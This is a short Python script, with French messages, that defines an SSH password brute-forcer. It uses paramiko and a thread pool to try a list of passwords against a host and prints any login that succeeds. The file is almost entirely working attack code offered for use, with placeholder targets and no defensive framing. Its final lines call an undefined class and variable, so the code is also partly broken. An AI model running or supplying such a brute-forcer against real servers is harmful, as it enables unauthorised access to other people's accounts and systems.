import paramiko
import threading
from concurrent.futures import ThreadPoolExecutor

class SSHBruteforcer:
    def __init__(self, hostname, username, password_list):
        self.hostname = hostname
        self.username = username
        self.password_list = password_list
        self.lock = threading.Lock()

    def _try_connect(self, password, timeout=10):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(self.hostname, username=self.username, password=password, timeout=timeout)
            with self.lock:
                print(f"Connexion SSH établie avec succès à {self.hostname} en utilisant le nom d'utilisateur {self.username} et le mot de passe {password}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            with self.lock:
                print(f"Échec de l'authentification SSH pour {self.username} à {self.hostname} avec le mot de passe {password}")
        except paramiko.ssh_exception.SSHException as e:
            with self.lock:
                print(f"Erreur de connexion SSH à {self.hostname} avec le mot de passe {password}: {str(e)}")
        except EOFError:
            with self.lock:
                print(f"EOFError rencontré lors de la tentative de connexion à {self.hostname} avec le mot de passe {password}")
        except Exception as e:
            with self.lock:
                print(f"Autre erreur lors de la connexion SSH à {self.hostname}: {str(e)}")
        finally:
            client.close()

        return False

    def test_connection(self, max_threads=10):
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            results = executor.map(self._try_connect, self.password_list)
            return any(results)



if __name__== "__main__":
    hostname = "adresse_ip_ou_nom_de_domaine"
    username = "nom_utilisateur"
    password_list = ["mdp1", "mdp2", "mdp3"]  # Liste de mots de passe à tester

    ssh_bruteforcer = SSHBruteforcer(hostname, username, password_list)
    ssh_bruteforcer.test_connection()

    ssh_tester = SSHTester(hostname, username, password)
    ssh_tester.test_connection()
